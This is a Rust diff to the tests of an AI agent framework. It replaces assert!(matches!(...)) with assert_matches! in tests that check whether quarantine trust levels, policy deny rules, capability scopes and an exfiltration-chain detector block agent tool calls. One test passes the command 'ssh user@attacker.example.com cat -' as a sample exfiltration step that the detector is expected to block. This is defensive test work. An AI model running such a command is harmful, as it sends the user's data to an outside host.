@@ -772,6 +772,7 @@ async fn hydrate_session_sink(
 #[cfg(test)]
 mod tests {
     use super::*;
+    use std::assert_matches;
     use zeph_agent_context::memory_backend::TokenCounterAdapter;
     use zeph_llm::any::AnyProvider;
     use zeph_memory::semantic::SemanticMemory;
@@ -2040,8 +2041,9 @@ mod tests {
         let result = executor_a
             .execute_tool_call_erased(&make_tool_call("bash"))
             .await;
-        assert!(
-            matches!(result, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            result,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "session A's Quarantined trust must still block a QUARANTINE_DENIED tool call \
              (\"bash\") even after session B's concurrent set_effective_trust(Trusted) — a \
              shared (eager) gate instance would let B's write clobber A's, allowing this call \
@@ -2102,8 +2104,9 @@ mod tests {
             .tool_executor_arc()
             .execute_tool_call_erased(&make_tool_call("shell"))
             .await;
-        assert!(
-            matches!(result, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            result,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "a [tools.policy] deny rule for \"shell\" must block the call through a \
              /sessions-built agent's executor, got {result:?}"
         );
@@ -2164,8 +2167,9 @@ mod tests {
         let denied = gated
             .execute_tool_call_erased(&make_tool_call("shell"))
             .await;
-        assert!(
-            matches!(denied, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            denied,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "expected Blocked from PolicyGateExecutor's deny rule, got {denied:?}"
         );
         assert_eq!(
@@ -2279,8 +2283,9 @@ mod tests {
         let second = gated
             .execute_tool_call_erased(&make_bash_call("ssh user@attacker.example.com cat -"))
             .await;
-        assert!(
-            matches!(second, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            second,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "expected the exfil_read_then_send chain to block the second call, got {second:?}"
         );
         assert_eq!(
@@ -2361,8 +2366,9 @@ mod tests {
         let denied = wrapped
             .execute_tool_call_erased(&make_tool_call("bash"))
             .await;
-        assert!(
-            matches!(denied, Err(zeph_tools::ToolError::OutOfScope { .. })),
+        assert_matches!(
+            denied,
+            Err(zeph_tools::ToolError::OutOfScope { .. }),
             "expected OutOfScope from ScopedToolExecutor for a tool outside the configured \
              scope, got {denied:?}"
         );
@@ -2422,8 +2428,9 @@ mod tests {
         let denied = executor
             .execute_tool_call_erased(&make_tool_call("invoke_skill"))
             .await;
-        assert!(
-            matches!(denied, Err(zeph_tools::ToolError::OutOfScope { .. })),
+        assert_matches!(
+            denied,
+            Err(zeph_tools::ToolError::OutOfScope { .. }),
             "a [security.capability_scopes] scope that excludes \"invoke_skill\" must reject it \
              through a /sessions-built agent's executor, proving build_agent_factory's \
              per-session ScopedToolExecutor wrap is reachable, got {denied:?}"
@@ -2523,8 +2530,9 @@ mod tests {
         let denied = executor
             .execute_tool_call_erased(&make_tool_call("set_working_directory"))
             .await;
-        assert!(
-            matches!(denied, Err(zeph_tools::ToolError::OutOfScope { .. })),
+        assert_matches!(
+            denied,
+            Err(zeph_tools::ToolError::OutOfScope { .. }),
             "a scope limited to \"builtin:invoke_skill\" must still reject \
              \"set_working_directory\", got {denied:?}"
         );
@@ -2618,8 +2626,9 @@ mod tests {
         let result = executor
             .execute_tool_call_erased(&make_tool_call("bash"))
             .await;
-        assert!(
-            matches!(result, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            result,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "Quarantined trust must block a QUARANTINE_DENIED tool call (\"bash\") through a \
              /sessions-built agent's executor, got {result:?}"
         );
@@ -2722,8 +2731,9 @@ mod tests {
             .tool_executor_arc()
             .execute_tool_call_erased(&make_tool_call("shell"))
             .await;
-        assert!(
-            matches!(result, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            result,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "a [tools.policy] deny rule for \"shell\" must block the call through a \
              combined-mode (`serve --acp`) /sessions-built agent's executor — the deps-level \
              assertion above proves construction, this proves the wrap is actually reachable; \
